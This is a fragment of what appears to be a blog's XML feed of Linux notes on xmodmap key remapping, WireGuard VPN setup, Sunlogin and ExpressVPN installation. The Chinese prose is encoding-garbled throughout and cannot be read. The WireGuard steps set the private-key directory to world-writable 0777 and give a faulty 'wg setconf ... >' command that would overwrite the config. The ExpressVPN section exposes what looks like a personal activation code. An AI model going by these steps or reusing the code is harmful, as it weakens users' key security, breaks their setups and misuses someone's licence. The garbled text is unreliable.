class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pke<br></code></pre></td></tr></table></figure><p>è¡¨ä¸­çš„ <code>Key</code> è¡¨ç¤º keycode å¯¹åº”çš„æŒ‰é”®.</p><p>å¦‚æœè¦è·³è¿‡ä¸€ä¸ª keysym, å°†å…¶å€¼è®¾ç½®ä¸º <code>NoSymble</code>.</p><p>å¤šåª’ä½“é”®æœ‰é¢„å®šä¹‰çš„æè¿°æ€§é”®ç¬¦, å¦‚ <code>XF86AudioMute</code>, å¯åœ¨  <code>/usr/include/X11/XF86keysym.h</code> ä¸­æ‰¾åˆ°.</p><p>è¦æ°¸ä¹…æ”¹å˜, å¯ä¿®æ”¹ <code>.xprofile</code> æˆ– <code>.xinitrc</code> æ–‡ä»¶.</p><h1 id="è‡ªå®šä¹‰æ˜ å°„è¡¨"><a href="#è‡ªå®šä¹‰æ˜ å°„è¡¨" class="headerlink" title="è‡ªå®šä¹‰æ˜ å°„è¡¨"></a>è‡ªå®šä¹‰æ˜ å°„è¡¨</h1><p>åˆ›å»ºä¸€ä¸ªæ˜ å°„åˆ—è¡¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pke &gt; ~/.Xmodmap<br></code></pre></td></tr></table></figure><p>æµ‹è¯•æ›´æ”¹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap ~/.Xmodmap<br></code></pre></td></tr></table></figure><h2 id="æ¿€æ´»"><a href="#æ¿€æ´»" class="headerlink" title="æ¿€æ´»"></a>æ¿€æ´»</h2><p>åœ¨ <code>~/.xinitrc</code> ä¸­æ·»åŠ :</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">[[ -f ~/.Xmodmap ]] &amp;&amp; xmodmap ~/.Xmodmap<br></code></pre></td></tr></table></figure><h2 id="ä¸´æ—¶ä¿®æ”¹"><a href="#ä¸´æ—¶ä¿®æ”¹" class="headerlink" title="ä¸´æ—¶ä¿®æ”¹"></a>ä¸´æ—¶ä¿®æ”¹</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -e <span class="hljs-string">&quot;keycode 46 = l L l L lstroke lstroke lstroke&quot;</span><br>$ xmodmap -e <span class="hljs-string">&quot;keysym a = e E&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ä¿®é¥°é”®"><a href="#ä¿®é¥°é”®" class="headerlink" title="ä¿®é¥°é”®"></a>ä¿®é¥°é”®</h1><p>å°±æ˜¯ modkey (mod æ˜¯ modifier çš„æ„æ€). </p><p>å¯¹ <code>xmodmap -pm</code> çš„è¾“å‡ºçš„ç†è§£:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xmodmap -pm<br><br>xmodmap:  up to 4 keys per modifier, (keycodes <span class="hljs-keyword">in</span> parentheses):<br><br><span class="hljs-built_in">shift</span>       Shift_L (0x32),  Shift_R (0x3e)<br>lock        Caps_Lock (0x25)<br>control     Control_L (0x42),  Control_R (0x69)<br>mod1        Alt_L (0x40),  Alt_R (0x6c),  Alt_L (0xcc),  Meta_L (0xcd)<br>mod2        Num_Lock (0x4d)<br>mod3        ISO_Level5_Shift (0xcb)<br>mod4        Super_L (0x85),  Super_R (0x86),  Super_L (0xce),  Hyper_L (0xcf)<br>mod5        ISO_Level3_Shift (0x5c)<br><br></code></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯æŒ‰å³ä¾§çš„é”®, éƒ½å¯ä»¥è¡¨ç¤ºå·¦ä¾§çš„ä¿®é¥°é”®. å°±æ¯”å¦‚:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shift </span>      <span class="hljs-keyword">Shift_L </span>(<span class="hljs-number">0x32</span>),  <span class="hljs-keyword">Shift_R </span>(<span class="hljs-number">0x3e</span>)<br></code></pre></td></tr></table></figure><p>è¡¨å, æŒ‰ä¸‹å·¦è¾¹çš„ Shift å’ŒæŒ‰ä¸‹ å³è¾¹çš„ Shift éƒ½ä¼šäº§ç”Ÿ shift ä¿®é¥°ç¬¦çš„ä½œç”¨.</p><p>ä½¿ç”¨ <code>!</code> ä½œä¸ºæ³¨é‡Š.</p><h1 id="Man-page"><a href="#Man-page" class="headerlink" title="Man page"></a>Man page</h1><p>åœ¨ Man Page ä¸­æœ‰è¯­æ³•è®²è§£ä»¥åŠç¤ºä¾‹.</p><h2 id="xev-ç¨‹åº"><a href="#xev-ç¨‹åº" class="headerlink" title="xev ç¨‹åº"></a>xev ç¨‹åº</h2><p>è¿™ä¸ªè½¯ä»¶æ‰“å¼€åå¯ç”¨æ¥æ£€æµ‹ keycode å’Œ keysym ç­‰ä¿¡æ¯.</p><h2 id="è¯­æ³•-keycode-Num-x3D-keysymname-â€¦"><a href="#è¯­æ³•-keycode-Num-x3D-keysymname-â€¦" class="headerlink" title="è¯­æ³•: keycode Num &#x3D; keysymname â€¦"></a>è¯­æ³•: keycode Num &#x3D; keysymname â€¦</h2><p>ä¸€ä¸ª keycode æœ€å¤šç»‘å®š 8 ä¸ª keysym.</p><p>ä¸€ä¸ª key åé¢è·Ÿç€çš„ keysym çš„å«ä¹‰:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">keycode 57 = n N<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä½ç½®æœ‰ç‰¹åˆ«çš„å«ä¹‰, å‡ºç°åœ¨ç¬¬ä¸€ä¸ªä½ç½®è¡¨æ˜ no modifier key is conjunction with this key, ç¬¬äºŒä¸ªä½ç½®è¡¨æ˜å’Œ Shift ä¸€èµ·æŒ‰, ç¬¬ä¸‰ä¸ª with Mode_switch key, ç¬¬å››ä¸ª with both Mode_switch and Shift.</p><h2 id="keycode"><a href="#keycode" class="headerlink" title="keycode"></a>keycode</h2><h2 id="clear-MODIFIERNAME"><a href="#clear-MODIFIERNAME" class="headerlink" title="clear MODIFIERNAME"></a>clear MODIFIERNAME</h2><p><code>clear</code> åé¢å¯ä»¥è·Ÿ: Shift, Lock, Control, Mod1, Mod2, Mod3, Mod4, Mod5 (modifier name å¯ä»¥ä¸åŒºåˆ†å¤§å°å†™).</p><h1 id="å‚è€ƒä¸€ä¸ª-Tutorial"><a href="#å‚è€ƒä¸€ä¸ª-Tutorial" class="headerlink" title="å‚è€ƒä¸€ä¸ª Tutorial"></a>å‚è€ƒä¸€ä¸ª Tutorial</h1><p><a href="http://xahlee.info/linux/linux_xmodmap_tutorial.html">å‚è€ƒ</a><br>xmodmap ä¸èƒ½åšçš„äº‹:</p><ul><li>ä¸èƒ½å°†ä¸€ä¸ªé”®å˜æˆ, æŒ‰ä¸‹è¿™ä¸ªé”®ç­‰äºå¤šä¸ªé”®çš„ç»„åˆ </li><li>ä¸èƒ½æ‰§è¡Œè„šæœ¬</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shell-ä¸­-eval-å‘½ä»¤</title>
    <link href="/2022/09/17/Shell-%E4%B8%AD-eval-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/17/Shell-%E4%B8%AD-eval-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-vim-ä¸­é€šè¿‡å…‰æ ‡æ‰€åœ¨ä½ç½®æ‰“å¼€æ–‡ä»¶</title>
    <link href="/2022/09/17/%E5%9C%A8-vim-%E4%B8%AD%E9%80%9A%E8%BF%87%E5%85%89%E6%A0%87%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6/"/>
    <url>/2022/09/17/%E5%9C%A8-vim-%E4%B8%AD%E9%80%9A%E8%BF%87%E5%85%89%E6%A0%87%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wireguard-è¯´æ˜å’Œä½¿ç”¨</title>
    <link href="/2022/09/17/wireguard-%E8%AF%B4%E6%98%8E%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/17/wireguard-%E8%AF%B4%E6%98%8E%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.wireguard.com/">é¡¹ç›®ä¸»é¡µ</a><br><a href="https://wiki.archlinux.org/title/WireGuard">ArchWiki ç›¸å…³</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>WireGuard æ˜¯ä¸€ç§åŠå…¶ç®€å•ä½†å¿«é€Ÿä¸”ç°ä»£çš„ VPN.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®‰è£… wireguard-tools åŒ…:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S wireguard-tools</span><br></code></pre></td></tr></table></figure><p>systemd-networkd å’Œ NetworkManager éƒ½ä¸º WireGuard æ¥å£è®¾ç½®æä¾›åŸç”Ÿæ”¯æŒ.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>ä½¿ç”¨ <code>ip link</code> æ˜¾ç¤ºçš„ <code>wg0</code> å°±æ˜¯ wireguard.</p><h2 id="åœ¨-peer-ä¸Šç”Ÿæˆå…¬é’¥å’Œç§é’¥"><a href="#åœ¨-peer-ä¸Šç”Ÿæˆå…¬é’¥å’Œç§é’¥" class="headerlink" title="åœ¨ peer ä¸Šç”Ÿæˆå…¬é’¥å’Œç§é’¥"></a>åœ¨ peer ä¸Šç”Ÿæˆå…¬é’¥å’Œç§é’¥</h2><p>peer å°±æ˜¯é‚£ä¸¤å°å»ºç«‹äº†éš§é“çš„ä¸»æœº.</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ wg genkey | <span class="hljs-type">tee</span> privatekey | <span class="hljs-type">wg</span> pubkey &gt; publickey<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬æ£€æŸ¥"><a href="#åŸºæœ¬æ£€æŸ¥" class="headerlink" title="åŸºæœ¬æ£€æŸ¥"></a>åŸºæœ¬æ£€æŸ¥</h2><p>ä¸å¸¦ä»»ä½•å‚æ•°ä½¿ç”¨ wg å‘½ä»¤å¯ä»¥å¿«é€ŸæŸ¥çœ‹å½“å‰çš„é…ç½®.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wg</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥ ping é€šéš§é“çš„å¦ä¸€ç«¯.</p><h2 id="é…ç½®æŒä¹…åŒ–"><a href="#é…ç½®æŒä¹…åŒ–" class="headerlink" title="é…ç½®æŒä¹…åŒ–"></a>é…ç½®æŒä¹…åŒ–</h2><p>å¯ä»¥ç”¨ <code>showconf</code> æ¥ä¿å­˜:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># wg showconf wg0 &gt; <span class="hljs-regexp">/etc/</span>wireguard/wg0.conf <br># wg setconf wg0 &gt; <span class="hljs-regexp">/etc/</span>wireguard/wg0.conf <br></code></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/etc/</span>wireguard/wg0.conf<br><br>[<span class="hljs-keyword">Interface</span>]<br>PrivateKey = [CLIENT <span class="hljs-keyword">PRIVATE</span> KEY]<br>MTU = <span class="hljs-number">1420</span><br><br>[Peer]<br>PublicKey = [SERVER PUBLICKEY]<br>AllowedIPs = <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span><span class="hljs-regexp">/24, 10.123.45.0/</span><span class="hljs-number">24</span>, <span class="hljs-number">1234</span>:<span class="hljs-number">4567</span>:<span class="hljs-number">89</span>ab::/<span class="hljs-number">48</span><br>Endpoint = [SERVER ENDPOINT]:<span class="hljs-number">5182</span><br>PersistentKeepalive = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®ä¸€ä¸ª-VPN-æœåŠ¡å™¨"><a href="#é…ç½®ä¸€ä¸ª-VPN-æœåŠ¡å™¨" class="headerlink" title="é…ç½®ä¸€ä¸ª VPN æœåŠ¡å™¨"></a>é…ç½®ä¸€ä¸ª VPN æœåŠ¡å™¨</h2><p>WireGuard è‡ªå¸¦ä¸€ä¸ªå¿«é€Ÿåˆ›å»ºå’Œé”€æ¯ VPN æœåŠ¡å™¨çš„å·¥å…· â€“ <code>wg-quick</code>.</p><p>å…·ä½“é…ç½®è§ <a href="https://wiki.archlinux.org/title/WireGuard">ArchWiki</a>.</p><p>éœ€è¦é…ç½®æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯.</p><p>å®¢æˆ·ç«¯çš„ IP éœ€è¦å’Œ <code>wg0server.conf</code> ä¸­çš„å­ç½‘æ©å—ç›¸åŒ.</p><p>ä½¿ç”¨ <code>wg-quick up wg0</code> æ¥å¯ç”¨ Interface, ä½¿ç”¨ <code>wg-quick down wg0</code> æ¥å…³é—­.</p><p>ä½¿ç”¨ <code>systemctl enable wg-quick@wg0</code> æ¥è‡ªåŠ¨å¯åŠ¨.</p><p>å¦‚æœä½¿ç”¨ NetworkManager, å¯èƒ½æœ‰å¿…è¦å¯ç”¨ NetworkManager-wait-online.service.</p><h2 id="æŸ¥çœ‹ç½‘ç»œè¿æ¥"><a href="#æŸ¥çœ‹ç½‘ç»œè¿æ¥" class="headerlink" title="æŸ¥çœ‹ç½‘ç»œè¿æ¥"></a>æŸ¥çœ‹ç½‘ç»œè¿æ¥</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo netstat -ntpl</span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a><a href="https://www.bilibili.com/video/BV1uT411w7Tq?share_source=copy_web&vd_source=07f553d0f02b7055cfbb295adfde9f48">å‚è€ƒ B ç«™</a></h1><p>VPN, Virtual Private Network çš„ä½œç”¨æ˜¯ä¿è¯è®¿é—®çš„ç§å¯†. å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†, æ ¡éªŒ.<br><img src="/../img/for_wireguard.png" alt="ç¤ºæ„å›¾"></p><p>wireguard æ˜¯ä¸€ç§ VPN æŠ€æœ¯. å…¶å¯ä»¥è®©è¿æ¥çš„è®¾å¤‡ä»¥ä¸ºè‡ªå·±å¤„äºåŒä¸€ä¸ªå†…ç½‘ä¸­. ä»ä¸Šé¢çš„ç¤ºæ„å›¾å¯ä»¥çœ‹å‡º, è¿™ä¸ªè™šæ‹Ÿçš„å†…ç½‘æ˜¯ç”± wireguard é“¾è·¯è¿æ¥çš„.</p><p>wireguard å¹¶ä¸åŒºåˆ†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯.</p><p>åœ¨ä»»ä½•è®¾å¤‡ä¸Šå¦‚æœå®‰è£…äº† wireguard éƒ½ä¼šè¢«è§†ä¸ºä¸€ä¸ªèŠ‚ç‚¹. å…¶æ—¢å¯ä»¥è¿æ¥å…¶ä»–è®¾å¤‡ä¹Ÿå¯å·²è¢«å…¶ä»–è®¾å¤‡ç›´æ¥è¿æ¥.</p><p>ä¹Ÿå°±æ˜¯è¯´, ç”¨ä¸€å°æ‹¥æœ‰å…¬ç½‘ IP çš„æœåŠ¡å™¨ä½œä¸ºè¿æ¥ç‚¹, ä½¿å¾—æ‰€æœ‰è¿æ¥åˆ°è¿™å°æœåŠ¡å™¨çš„ä¸»æœºéƒ½å¯ä»¥é€šä¿¡.</p><h1 id="Ubuntu-ä¸Šçš„æ‰‹åŠ¨æ“ä½œ-å…·ä½“çœ‹æ–‡æ¡£-å·²æ‹‰å–åˆ°æœ¬åœ°"><a href="#Ubuntu-ä¸Šçš„æ‰‹åŠ¨æ“ä½œ-å…·ä½“çœ‹æ–‡æ¡£-å·²æ‹‰å–åˆ°æœ¬åœ°" class="headerlink" title="Ubuntu ä¸Šçš„æ‰‹åŠ¨æ“ä½œ (å…·ä½“çœ‹æ–‡æ¡£, å·²æ‹‰å–åˆ°æœ¬åœ°)"></a>Ubuntu ä¸Šçš„æ‰‹åŠ¨æ“ä½œ (å…·ä½“çœ‹æ–‡æ¡£, å·²æ‹‰å–åˆ°æœ¬åœ°)</h1><p>å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install wireguard resolvconf<br></code></pre></td></tr></table></figure><p>å¼€å¯ ipv4 è½¬å‘, ä½¿è¯¥æœåŠ¡å™¨èƒ½å¤Ÿæˆä¸ºä¸€ä¸ªè½¬å‘çš„æœåŠ¡å™¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>sysctl -p</code> æŸ¥çœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ.</p><p>wireguard çš„é…ç½®æ–‡ä»¶ä½äº <code>/etc/wireguard</code></p><h2 id="ç”ŸæˆæœåŠ¡å™¨ä¸Šçš„å¯†é’¥å¯¹"><a href="#ç”ŸæˆæœåŠ¡å™¨ä¸Šçš„å¯†é’¥å¯¹" class="headerlink" title="ç”ŸæˆæœåŠ¡å™¨ä¸Šçš„å¯†é’¥å¯¹"></a>ç”ŸæˆæœåŠ¡å™¨ä¸Šçš„å¯†é’¥å¯¹</h2><p>æ¯ä¸€ä¸ªèŠ‚ç‚¹éœ€è¦ç”Ÿæˆä¸€å¯¹å¯†é’¥.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> /etc/wireguard<br>$ <span class="hljs-built_in">chmod</span> 0777 /etc/wireguard<br>$ <span class="hljs-built_in">umask</span> 0777<br>$ wg genkey &gt; server.key<br>$ wg pubkey &lt; server.key &gt; server.key.pub<br></code></pre></td></tr></table></figure><p>æœ€åä¸€è¡Œæ˜¯æ ¹æ®ç§é’¥æ¥åˆ›å»ºå…¬é’¥.</p><h2 id="ç”Ÿæˆå®¢æˆ·ç«¯çš„å¯†é’¥å¯¹"><a href="#ç”Ÿæˆå®¢æˆ·ç«¯çš„å¯†é’¥å¯¹" class="headerlink" title="ç”Ÿæˆå®¢æˆ·ç«¯çš„å¯†é’¥å¯¹"></a>ç”Ÿæˆå®¢æˆ·ç«¯çš„å¯†é’¥å¯¹</h2><p>æ˜¯åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆ.</p><p>å’Œä¸Šé¢åŒæ ·çš„æ“ä½œ.</p><h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><p><code>[Interface]</code> é…ç½®çš„æ˜¯è™šæ‹Ÿç½‘å¡çš„ä¿¡æ¯.</p><p>ç›‘å¬ç«¯å£ç”¨æ¥åˆ¤æ–­ client çš„è¿æ¥.</p><p>æ¯æ·»åŠ ä¸€ä¸ª peer éƒ½è¦åœ¨ server çš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ  <code>[Peer]</code> å—.</p><p>å®¢æˆ·ç«¯çš„é…ç½®å’ŒæœåŠ¡å™¨ç«¯çš„é…ç½®ç±»ä¼¼.</p><p>é‡æ–°è®¾ç½®äº†é…ç½®æ–‡ä»¶, éœ€è¦é‡å¯ wireguard, åˆ©ç”¨ down å’Œ up.</p><p>å®¢æˆ·ç«¯çš„ IP éœ€è¦åœ¨ æœåŠ¡å™¨ç«¯è®¾ç½® (è¿™é‡Œçš„ IP æ˜¯è™šæ‹Ÿ IP).</p><p>Endpoint æ˜¯è®¾ç½®å¯¹ç«¯ä¹Ÿå°±æ˜¯æœåŠ¡å™¨çš„ IP å’Œç«¯å£. å…¶å®æ˜¯æˆ‘ä»¬è¢«å…¶ä»–èŠ‚ç‚¹ä¸»åŠ¨è¿æ¥çš„æ—¶å€™æ‰€ä½¿ç”¨çš„ IP. è®¾ç½® server æ˜¯å› ä¸º server æ˜¯è¢«ä¸»åŠ¨è¿æ¥çš„.</p><p>wireguard ä½¿ç”¨çš„æ˜¯ UDP åè®®.</p><p>è¿æ¥ä¹‹åä¸¤å°ä¸»æœºå°±å¯ä»¥é€šè¯äº†.</p><p>å¯ä»¥ç”¨ <code>wg</code> å‘½ä»¤æ¥æŸ¥çœ‹ wireguard çš„è¿æ¥çŠ¶å†µ.</p><p><img src="/../img/another_rela_of_wireguard.png"></p><p>keepalive æ˜¯å°è¯•é‡è¿.</p><p>æ­å»ºäº†å†…ç½‘ç©¿é€å°±å¯ä»¥ç›´æ¥è¿æ¥è¿œç«¯æ²¡æœ‰å…¬ç½‘ IP çš„æœåŠ¡å™¨.</p><h1 id="åˆ©ç”¨-Docker-æ­å»º"><a href="#åˆ©ç”¨-Docker-æ­å»º" class="headerlink" title="åˆ©ç”¨ Docker æ­å»º"></a>åˆ©ç”¨ Docker æ­å»º</h1><p><a href="https://github.com/WeeJeWel/wg-easy">github ç›¸å…³é¡µé¢</a><br>å…¶ç”Ÿæˆçš„é…ç½®æ–‡ä»¶æ˜¯ client çš„.</p><p>åœ¨æœ‰å…¬ç½‘çš„æœåŠ¡å™¨åˆ›å»ºä¸€ä¸ª Docker, ç„¶åç”¨è¿™ä¸ª Docker è®¿é—®æ§åˆ¶é¡µé¢.</p><h2 id="æ‰‹æœºè¿å…¥"><a href="#æ‰‹æœºè¿å…¥" class="headerlink" title="æ‰‹æœºè¿å…¥"></a>æ‰‹æœºè¿å…¥</h2><p>å¯ä»¥ç”¨æ‰‹æœºå®¢æˆ·ç«¯æ‰«äºŒç»´ç .</p><h1 id="è‡ªå·±å°è¯•"><a href="#è‡ªå·±å°è¯•" class="headerlink" title="è‡ªå·±å°è¯•"></a>è‡ªå·±å°è¯•</h1><h2 id="æ‰‹åŠ¨é…ç½®"><a href="#æ‰‹åŠ¨é…ç½®" class="headerlink" title="æ‰‹åŠ¨é…ç½®"></a>æ‰‹åŠ¨é…ç½®</h2><p>æŒ‰ç…§ä¸Šé¢ å¸æ³¢å›¾ çš„åšå®¢å†…å®¹å¯ä»¥æˆåŠŸæ­å»º.</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>å‡ºäº†äº›å°é—®é¢˜.</p><p>ç»“æœæ˜¯æˆ‘æœåŠ¡å™¨çš„ç«¯å£å¼€æ”¾é”™è¯¯, å¼€æ”¾äº†å¦ä¸€ä¸ªç«¯å£.</p><p>æŒ‰ç…§æ•™ç¨‹å³å¯å®Œæˆ.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-sunloginclient-è¿œç¨‹è¿æ¥</title>
    <link href="/2022/09/17/%E4%BD%BF%E7%94%A8-sunloginclient-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
    <url>/2022/09/17/%E4%BD%BF%E7%94%A8-sunloginclient-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ yay ä¸‹è½½æˆ–è€…ä¸Š aur æœç´¢:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S sunloginclient</span><br></code></pre></td></tr></table></figure><p>ç”¨:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sunloginclientj<br></code></pre></td></tr></table></figure><p>å¯åŠ¨è½¯ä»¶.</p><p>é€šè¿‡è¾“å…¥è¯†åˆ«ç å’ŒçŠ¶æ€ç æ¥è¿æ¥.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥è¯¢æœ¬æœº-ip-ä»¥åŠç½‘ç»œä¾›åº”å•†</title>
    <link href="/2022/09/17/%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA-ip-%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E4%BE%9B%E5%BA%94%E5%95%86/"/>
    <url>/2022/09/17/%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA-ip-%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E4%BE%9B%E5%BA%94%E5%95%86/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ç™¾åº¦ä¸Šæœç´¢ ip, å°±ä¼šæ˜¾ç¤ºæœ¬æœº ip å’Œç½‘ç»œä¾›åº”å•†.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-ExpressVPN-æ­å»º</title>
    <link href="/2022/09/16/%E5%85%B3%E4%BA%8E-ExpressVPN-%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/16/%E5%85%B3%E4%BA%8E-ExpressVPN-%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="é€‰æ‹©-VPN-Server-Location"><a href="#é€‰æ‹©-VPN-Server-Location" class="headerlink" title="é€‰æ‹© VPN Server Location"></a>é€‰æ‹© VPN Server Location</h1><p><a href="https://www.expressvpn.com/vpn-server">åˆ—è¡¨</a><br>è²Œä¼¼å¯ä»¥ç”¨ä¸€ä¸‹å‘½ä»¤è¿æ¥:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">expressvpn connect smart<br></code></pre></td></tr></table></figure><h1 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h1><p><a href="https://www.expressvpn.com/setup#linux">å®˜ç½‘ä¸‹è½½</a><br>ä¸‹è½½äº†è½¯ä»¶åŒ…ä¹‹å:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pacman -U<span class="hljs-meta"> [installer filename]</span><br></code></pre></td></tr></table></figure><p>é‡Œé¢çš„ Setup ä¸€æ ä¸‹çš„ activation code (æ¿€æ´»ç ):</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">E2A2DQCUVGGXQB4FSOSPFKT</span>  <br></code></pre></td></tr></table></figure><h1 id="æ¿€æ´»"><a href="#æ¿€æ´»" class="headerlink" title="æ¿€æ´»"></a>æ¿€æ´»</h1><p>è¾“å…¥:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ expressvpn <span class="hljs-built_in">activate</span><br></code></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥ activation code.</p><p>å¯èƒ½ä¼šè¯¢é—®ä½ æ˜¯å¦è¿›è¡Œ anonymized diagnostic reports (åŒ¿åè¯Šæ–­).</p><p>å¦‚æœæƒ³å…³æ‰:</p><figure class="highlight 